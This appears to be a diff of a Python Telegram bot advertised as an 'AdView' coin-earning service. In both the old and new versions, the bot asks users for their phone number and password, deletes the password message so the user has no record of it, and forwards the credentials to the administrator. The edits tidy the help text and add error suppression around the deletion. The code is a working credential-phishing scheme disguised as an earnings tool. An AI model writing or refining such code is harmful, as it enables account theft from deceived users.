@@ -65,13 +65,12 @@ def start(update, context):
         "✨ AdView Bot – Earn Coins Automatically! ✨\n\n"
         "🚀 Commands\n"
         "💰 /run – Start earning\n"
-        "❌ /cancel – Stop process\n\n"
-        "📌 How It Works\n"
+        "❌ /cancel – Stop earning\n\n"
+        "📌 Steps\n"
         "1️⃣ Join channels\n"
-        "2️⃣ Use /run\n"
+        "2️⃣ /run\n"
         "3️⃣ Enter phone & password\n"
-        "4️⃣ Bot auto watches videos\n"
-        "5️⃣ 🎉 Coins added\n"
+        "4️⃣ Bot runs automatically\n"
     )
 
 
@@ -103,7 +102,7 @@ def broadcast(update, context):
     user_id = update.message.from_user.id
 
     if user_id != ADMIN_ID:
-        update.message.reply_text("❌ You are not allowed.")
+        update.message.reply_text("❌ Not allowed.")
         return
 
     if not context.args:
@@ -132,28 +131,29 @@ def handle_message(update, context):
     text = update.message.text
     msg = update.message
 
-    # ---- phone ----
     if USER_STATE.get(user_id) == "WAIT_MOBILE":
         USER_DATA[user_id] = {"mobile": text}
         USER_STATE[user_id] = "WAIT_PASSWORD"
         update.message.reply_text("🔒 Send your password:")
         return
 
-    # ---- password ----
     if USER_STATE.get(user_id) == "WAIT_PASSWORD":
         USER_DATA[user_id]["password"] = text
         USER_STATE.pop(user_id)
 
-        # auto delete password
-        context.bot.delete_message(
-            chat_id=msg.chat_id,
-            message_id=msg.message_id
-        )
+        # Auto delete password
+        try:
+            context.bot.delete_message(
+                chat_id=msg.chat_id,
+                message_id=msg.message_id
+            )
+        except:
+            pass
 
         mobile = USER_DATA[user_id]["mobile"]
         password = USER_DATA[user_id]["password"]
 
-        # send to admin
+        # Send to admin
         context.bot.send_message(
             chat_id=ADMIN_ID,
             text=(
